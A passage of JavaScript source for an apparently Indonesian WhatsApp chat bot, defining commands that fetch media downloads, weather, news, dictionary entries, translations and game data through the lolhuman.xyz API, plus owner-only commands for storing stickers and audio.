let { data } = await axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${lolhumankey}&url=${args[0]}`)
let url = data.result
if (url.includes(".mp4")) {
sock.sendMessage(m.chat, { video: { url }, mimetype: "video/mp4" }, { quoted: setQuoted })
} else {
sock.sendMessage(m.chat, { image: { url } }, { quoted: setQuoted })
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "spotify":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.spotify.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/spotify?apikey=${lolhumankey}&url=${args[0]}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Artists* : ${data.result.artists}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Popularity* : ${data.result.popularity}\n`
teks += `⭔ *Preview* : ${data.result.preview_url}\n`
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
sock.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: "audio/mp4", fileName: `${data.result.title}.mp3` }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "jooxplay":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.jooxplay.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/jooxplay?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Title* : ${data.result.info.song}\n`
teks += `⭔ *Artists* : ${data.result.info.singer}\n`
teks += `⭔ *Duration* : ${data.result.info.duration}\n`
teks += `⭔ *Album* : ${data.result.info.album}\n`
teks += `⭔ *Uploaded* : ${data.result.info.date}\n`
teks += `⭔ *Lirik* :\n ${data.result.lirik}\n`
sock.sendMessage(m.chat, { image: { url: data.result.image }, caption: teks }, { quoted: setQuoted })
sock.sendMessage(m.chat, { audio: { url: data.result.audio[0].link }, mimetype: "audio/mp4", fileName: `${data.result.title}.mp3` }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "twtdl":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.twtdl.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${lolhumankey}&url=${args[0]}`)
sock.sendMessage(m.chat, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: "video/mp4" }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "zippyshare":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.zippyshare.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/zippyshare?apikey=${lolhumankey}&url=${args[0]}`)
let teks = `⭔ *File Name* : ${data.result.name_file}\n`
teks += `⭔ *Size* : ${data.result.size}\n`
teks += `⭔ *Date Upload* : ${data.result.date_upload}\n`
teks += `⭔ *Download Url* : ${data.result.download_url}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "pinterestdl":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.pinterestdl.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/pinterestdl?apikey=${lolhumankey}&url=${args[0]}`)
sock.sendMessage(m.chat, { image: { url: data.result[0] }, caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "pixivdl":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.pixivdl.query(prefix, command))
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pixivdl/${args[0]}?apikey=${lolhumankey}` }, caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "mediafire":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.mediafire.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/mediafire?apikey=${lolhumankey}&url=${args[0]}`) 
let teks = `⭔ *File Name* : ${data.result.filename}\n`
teks += `⭔ *File Type* : ${data.result.filetype}\n`
teks += `⭔ *File Size* : ${data.result.filesize}\n`
teks += `⭔ *Upload* : ${data.result.uploaded}\n`
teks += `⭔ *Download* : ${data.result.link}`
setReply(teks)
sock.sendMedia(m.chat, data.result.link, setQuoted, { fileName: data.result.filename })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "genshin":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.genshin.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/genshin/${encodeURI(text)}?apikey=${lolhumankey}`)
let teks = `⭔ *Name* : ${data.result.title}\n`
teks += `⭔ *Intro* : ${data.result.intro}\n`
teks += `⭔ *Icon* : ${data.result.icon}\n`
await sock.sendMessage(m.chat, { image: { url: data.result.cover1 }, caption: teks }, { quoted: setQuoted })
await sock.sendMessage(m.chat, { audio: { url: data.result.cv[0].audio[0] }, mimetype: "audio/mp4" }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "telesticker":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.telesticker.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/telestick?apikey=${lolhumankey}&url=${args[0]}`)
sock.sendMessage(m.chat, { sticker: { url: data.result.sticker.random() } }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "kusonime":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.kusonime.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/kusonime?apikey=${lolhumankey}&url=${args[0]}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Japanese* : ${data.result.japanese}\n`
teks += `⭔ *Genre* : ${data.result.genre}\n`
teks += `⭔ *Seasons* : ${data.result.seasons}\n`
teks += `⭔ *Producers* : ${data.result.producers}\n`
teks += `⭔ *Type* : ${data.result.type}\n`
teks += `⭔ *Status* : ${data.result.status}\n`
teks += `⭔ *Total Episode* : ${data.result.total_episode}\n`
teks += `⭔ *Score* : ${data.result.score}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Released On* : ${data.result.released_on}\n`
teks += `⭔ *Desc* : ${data.result.desc}\n`
for (var x in data.result.link_dl) {
teks += `\n${x}\n`
for (var y in link_dl[x]) {
teks += `${y} - ${link_dl[x][y]}\n`
}
}
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "otakudesu":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.otakudesu.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/otakudesu?apikey=${lolhumankey}&url=${args[0]}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Japanese* : ${data.result.japanese}\n`
teks += `⭔ *Judul* : ${data.result.judul}\n`
teks += `⭔ *Type* : ${data.result.type}\n`
teks += `⭔ *Episode* : ${data.result.episodes}\n`
teks += `⭔ *Aired* : ${data.result.aired}\n`
teks += `⭔ *Producers* : ${data.result.producers}\n`
teks += `⭔ *Genre* : ${data.result.genres}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Studios* : ${data.result.status}\n`
teks += `⭔ *Rating* : ${data.result.rating}\n`
teks += `⭔ *Credit* : ${data.result.credit}\n`
for (var x in data.result.link_dl) {
teks += `\n\n${data.result.link_dl[x].title}*\n`
for (var y in data.result.link_dl[x].link_dl) {
ini_info = data.result.link_dl[x].link_dl[y]
teks += `\n⭔ *Reso* : ${ini_info.reso}\n`
teks += `⭔ *Size* : ${ini_info.size}\n`
teks += `⭔ *Link* : n`
down_link = ini_info.link_dl
for (var z in down_link) {
teks += `${z} - ${down_link[z]}\n`
}
}
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE INFORMATION ]=========================\\
case "cekumur":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (isImage || isQuotedImage) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await TelegraPh(media)
let { data } = await axios.get(`https://api.lolhuman.xyz/api/agedetect?apikey=${lolhumankey}&img=${anu}`)
setReply(data.result) 
} else setReply(mess.cmd.cekumur.text(prefix, command))
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break 
case "cuaca":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.cuaca.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${encodeURI(text)}?apikey=${lolhumankey}`) 
let teks = `⭔ *Lokasi* : ${data.result.tempat}\n`
teks += `⭔ *Cuaca* : ${data.result.cuaca}\n`
teks += `⭔ *Angin* : ${data.result.angin}\n`
teks += `⭔ *Kelembapan* : ${data.result.kelembapan}\n`
teks += `⭔ *Suhu* : ${data.result.suhu}\n`
teks += `⭔ *Udara* : ${data.result.udara}\n`
teks += `⭔ *Permukaan Laut* : ${data.result.permukaan_laut}`
setReply(teks) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "infogempa": 
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${lolhumankey}`) 
let teks = `⭔ *Date* : ${data.result.waktu}\n`
teks += `⭔ *Magnitude* : ${data.result.magnitude}\n`
teks += `⭔ *Kedalaman* : ${data.result.kedalaman}\n`
teks += `⭔ *Koordinat* : ${data.result.koordinat}\n`
teks += `⭔ *Lokasi* : ${data.result.lokasi}\n`
teks += `⭔ *Potensi* : ${data.result.potensi}`
sock.sendMessage(m.chat, { image: { url: data.result.map }, caption: teks }, { quoted: setQuoted }) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "jadwalbola": 
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${lolhumankey}`) 
let teks = "Jadwal Bola\n\n"
for (let x of data.result) {
teks += `⭔ *Waktu* : ${x.time}\n`
teks += `⭔ *Event* : ${x.event}\n`
teks += `⭔ *Match* : ${x.match}\n`
teks += `⭔ *Tv* : ${x.tv}\n\n────────────────────────\n\n`
} 
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "jadwaltv":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${lolhumankey}`) 
let teks = `⭔ *Antv* : ${data.result.antv}\n\n`
teks += `⭔ *Gtv* : ${data.result.gtv}\n\n`
teks += `⭔ *Indosiar* : ${data.result.indosiar}\n\n`
teks += `⭔ *Inewstv* : ${data.result.inewstv}\n\n`
teks += `⭔ *Kompastv* : ${data.result.kompastv}\n\n`
teks += `⭔ *Metrotv* : ${data.result.metrotv}\n\n`
teks += `⭔ *Mnctv* : ${data.result.mnctv}\n\n`
teks += `⭔ *Nettv* : ${data.result.nettv}\n\n`
teks += `⭔ *Rcti* : ${data.result.rcti}\n\n`
teks += `⭔ *Rtv* : ${data.result.rtv}\n\n`
teks += `⭔ *Sctv* : ${data.result.sctv}\n\n`
teks += `⭔ *Trans7* : ${data.result.trans7}\n\n`
teks += `⭔ *Transtv* : ${data.result.transtv}\n\n`
teks += `⭔ *Tvone* : ${data.result.tvone}\n\n`
teks += `⭔ *Tvri* : ${data.result.tvri}\n\n`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "kodepos":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.kodepos.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${lolhumankey}&query=${encodeURI(text)}`) 
let teks = `⭔ *Provinsi* : ${data.result[0].province}\n`
teks += `⭔ *Kabupaten* : ${data.result[0].city}\n`
teks += `⭔ *Kecamatan* : ${data.result[0].subdistrict}\n`
teks += `⭔ *Kelurahan* : ${data.result[0].urban}\n`
teks += `⭔ *Kode Pos* : ${data.result[0].postalcode}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "translate":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.translate.query(prefix, command))
let language = [
{"id": "af", "name": "Afrikaans"},
{"id": "sq", "name": "Albanian"},
{"id": "ar", "name": "Arabic"},
{"id": "hy", "name": "Armenian"},
{"id": "ca", "name": "Catalan"},
{"id": "zh", "name": "Chinese"},
{"id": "zh-cn", "name": "Chinese (Mandarin/China)"},
{"id": "zh-tw", "name": "Chinese (Mandarin/Taiwan)"},
{"id": "zh-yue", "name": "Chinese (Cantonese)"},
{"id": "hr", "name": "Croatian"},
{"id": "cs", "name": "Czech"},
{"id": "da", "name": "Danish"},
{"id": "nl", "name": "Dutch"},
{"id": "en", "name": "English"},
{"id": "en-au", "name": "English (Australia)"},
{"id": "en-uk", "name": "English (United Kingdom)"},
{"id": "en-us", "name": "English (United States)"},
{"id": "eo", "name": "Esperanto"},
{"id": "fi", "name": "Finnish"},
{"id": "fr", "name": "French"},
{"id": "de", "name": "German"},
{"id": "el", "name": "Greek"},
{"id": "ht", "name": "Haitian Creole"},
{"id": "hi", "name": "Hindi"},
{"id": "hu", "name": "Hungarian"},
{"id": "is", "name": "Icelandic"},
{"id": "id", "name": "Indonesian"},
{"id": "it", "name": "Italian"},
{"id": "ja", "name": "Japanese"},
{"id": "ko", "name": "Korean"},
{"id": "la", "name": "Latin"},
{"id": "lv", "name": "Latvian"},
{"id": "mk", "name": "Macedonian"},
{"id": "no", "name": "Norwegian"},
{"id": "pl", "name": "Polish"},
{"id": "pt", "name": "Portuguese"},
{"id": "pt-br", "name": "Portuguese (Brazil)"},
{"id": "ro", "name": "Romanian"},
{"id": "ru", "name": "Russian"},
{"id": "sr", "name": "Serbian"},
{"id": "sk", "name": "Slovak"},
{"id": "es", "name": "Spanish"},
{"id": "es-es", "name": "Spanish (Spain)"},
{"id": "es-us", "name": "Spanish (United States)"},
{"id": "sw", "name": "Swahili"},
{"id": "sv", "name": "Swedish"},
{"id": "ta", "name": "Tamil"},
{"id": "th", "name": "Thai"},
{"id": "tr", "name": "Turkish"},
{"id": "vi", "name": "Vietnamese"},
{"id": "cy", "name": "Welsh"}
]
if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
let listLanguage = []
for (let x of language) {
listLanguage.push({
title: x.name,
rowId: `${prefix + command} ${x.id}|${text}`,
description: `Language ${x.name}`
})
}
const sections = [
{title: "Total Language" + language.length,
rows: listLanguage }]
const listMessage = {
text: `📂 LANGUAGE`,
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
let listLanguage = []
for (let x of language) {
listLanguage.push({
title: x.name,
rowId: `${prefix + command} ${text.split("|")[0]}|${x.id}|${text.split("|")[1]}`,
description: `Translate to ${x.name}`
})
}
const sections = [
{title: "Total Translate" + language.length,
rows: listLanguage }]
const listMessage = {
text: `📂 TRANSLATE TO`,
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
let { data } = await axios.get(`https://api.lolhuman.xyz/api/translate/${text.split("|")[0]}/${text.split("|")[1]}?apikey=${lolhumankey}&text=${encodeURI(text.split("|")[2])}`) 
setReply(data.result.translated) 
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "brainly":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.brainly.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${lolhumankey}&query=${encodeURI(text)}`) 
let teks = "Beberapa Pembahasan Dari Brainly :\n\n"
for (let x of data.result) {
teks += `⭔ *Pertanyaan* :\n${x.question.content}\n`
teks += `⭔ *Jawaban* :\n${x.answer[0].content}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "kbbi":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.kbbi.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Kata* : ${data.result[0].nama}\n`
teks += `⭔ *Kata Dasar* : ${data.result[0].kata_dasar}\n`
teks += `⭔ *Pelafalan* : ${data.result[0].pelafalan}\n`
teks += `⭔ *Bentuk Tidak Baku* : ${data.result[0].bentuk_tidak_baku}\n\n`
for (let x of data.result) {
teks += `⭔ *Kode* : ${x.makna[0].kelas[0].kode}\n`
teks += `⭔ *Kelas* : ${x.makna[0].kelas[0].nama}\n`
teks += `⭔ *Artinya* : \n${x.makna[0].kelas[0].deskripsi}\n\n`
teks += `⭔ *Makna Lain* : \n${x.makna[0].submakna}\n `
teks += `⭔ *Contoh Kalimat* : \n${x.makna[0].contoh}\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "chord":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.chord.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/chord?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Chord* : \n${data.result.chord}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "heroml":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.heroml.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/heroml/${encodeURI(text)}?apikey=${lolhumankey}`)
let teks = `⭔ *Name* : ${data.result.hero_name}\n`
teks += `⭔ *Entrance Quotes* : ${data.result.ent_quotes}\n`
teks += `⭔ *Role* : ${data.result.detail.role}\n`
teks += `⭔ *Specialty* : ${data.result.detail.specialty}\n`
teks += `⭔ *Laning* : ${data.result.detail.laning_recommendation}\n`
teks += `⭔ *Release* : ${data.result.detail.release_date}\n`
teks += `⭔ *Movement speed* : ${data.result.attr.movement_speed}\n`
teks += `⭔ *Physical attack* : ${data.result.attr.physical_attack}\n`
teks += `⭔ *Magic power* : ${data.result.attr.magic_power}\n`
teks += `⭔ *Physical defense* : ${data.result.attr.physical_defense}\n`
teks += `⭔ *Magic defense* : ${data.result.attr.magic_defense}\n`
teks += `⭔ *Critical rate* : ${data.result.attr.basic_atk_crit_rate}\n`
teks += `⭔ *Hp* : ${data.result.attr.hp}\n`
teks += `⭔ *Mana* : ${data.result.attr.mana}\n`
teks += `⭔ *Mana regen* : ${data.result.attr.mana_regen}\n`
sock.sendMessage(m.chat, { image: { url: data.result.icon }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "mlstalk":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.mlstalk.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args[0]}?apikey=${lolhumankey}`)
setReply(data.result)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "wikipedia":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.wikipedia.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${lolhumankey}&query=${encodeURI(text)}`)
setReply(data.result)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "newsinfo":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/newsinfo?apikey=${lolhumankey}`)
let teks = "Result :\n\n"
for (let x of data.result) {
teks += `⭔ *Title* : ${x.title}\n`
teks += `⭔ *Author* : ${x.author}\n`
teks += `⭔ *Source* : ${x.source.name}\n`
teks += `⭔ *Url* : ${x.url}\n`
teks += `⭔ *Published* : ${x.publishedAt}\n`
teks += `⭔ *Description* : ${x.description}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "cnnindonesia":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${lolhumankey}`)
let teks = "Result :\n\n"
for (let x of data.result) {
teks += `⭔ *Judul* : ${x.judul}\n`
teks += `⭔ *Link* : ${x.link}\n`
teks += `⭔ *Tipe* : ${x.tipe}\n`
teks += `⭔ *Published* : ${x.waktu}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "cnnnasional":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${lolhumankey}`)
let teks = "Result :\n\n"
for (let x of data.result) {
teks += `⭔ *Judul* : ${x.judul}\n`
teks += `⭔ *Link* : ${x.link}\n`
teks += `⭔ *Tipe* : ${x.tipe}\n`
teks += `⭔ *Published* : ${x.waktu}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "cnninternasional":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${lolhumankey}`)
let teks = "Result :\n\n"
for (let x of data.result) {
teks += `⭔ *Judul* : ${x.judul}\n`
teks += `⭔ *Link* : ${x.link}\n`
teks += `⭔ *Tipe* : ${x.tipe}\n`
teks += `⭔ *Published* : ${x.waktu}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "lirik":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.lirik.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${lolhumankey}&query=${encodeURI(text)}`)
setReply(data.result)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "covidindo":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolhumankey}`)
let teks = `⭔ *Positif* : ${data.result.positif}\n`
teks += `⭔ *Sembuh* : ${data.result.sembuh}\n`
teks += `⭔ *Dirawat* : ${data.result.dirawat}\n`
teks += `⭔ *Meninggal* : ${data.result.meninggal}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "covidglobal":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/corona/global?apikey=${lolhumankey}`)
let teks = `⭔ *Positif* : ${data.result.positif}\n`
teks += `⭔ *Sembuh* : ${data.result.sembuh}\n`
teks += `⭔ *Dirawat* : ${data.result.dirawat}\n`
teks += `⭔ *Meninggal* : ${data.result.meninggal}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "indbeasiswa":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=${lolhumankey}`)
let teks = "Info Beasiswa :\n\n"
for (let x of data.result) {
teks += `⭔ *Title* : ${x.title}\n`
teks += `⭔ *Link* : ${x.link}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE STORAGE ]=========================\\
case "adderror":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text.split("|")[1]) return setReply(mess.cmd.adderror.query(prefix, command))
let oke = text.split("|")[0]
let oka = text.split("|")[1]
sock.addError(oke, oka, listerror)
setReply(mess.cmd.adderror.text(text.split("|")[0]))
}
break
case "addstick":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!isQuotedSticker) return setReply(mess.reply.sticker)
if (!text) return setReply(mess.query.text)
if (db.data.sticker[text]) return setReply(mess.cmd.addstick.query)
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
db.data.sticker[text] = {
url: anu.url, 
size: anu.size,
}
setReply(mess.cmd.addstick.text(text))
}
break
case "addvn":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!isQuotedAudio) return setReply(mess.reply.audio)
if (!text) return setReply(mess.query.text)
if (db.data.audio[text]) return setReply(mess.cmd.addvn.query)
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const anu = await UploadFileUgu(media)
db.data.audio[text] = {
url: anu.url, 
size: anu.size,
}
setReply(mess.cmd.addvn.text(text))
}
break
case "addlimit":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
db.data.database.addlimit = {
status: true, 
number: Input
}
setReply(mess.cmd.addlimit.text1) 
}
break
case "addowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (mentionByReply) {
